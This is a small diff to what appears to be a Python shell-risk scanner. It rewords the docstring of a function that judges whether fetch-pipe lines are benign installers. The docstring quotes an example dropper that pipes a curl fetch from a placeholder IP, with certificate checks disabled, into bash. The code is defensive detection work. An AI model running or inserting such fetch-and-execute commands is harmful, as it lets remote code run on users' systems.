@@ -1090,7 +1090,7 @@ _FETCH_LIKE_RE = re.compile(r"\b(?:curl|wget)\b|<\(|\$\(", re.I)
 
 
 def _installer_line(raw):
-    """Every fetch-pipe on the line is a first-party installer, judged on the COMMAND (an
+    """Every fetch-pipe on the line is an installer-shaped HTTPS fetch, judged on the COMMAND (an
     inline-code backtick or a docs URL elsewhere on the line is not part of the fetch), and the
     rest of the command's code span (or bare-prose sentence) carries no further fetch: a dropper
     appended as `| tee x | bash <(curl -sk https://203.0.113.9/p)` keeps the line at high."""
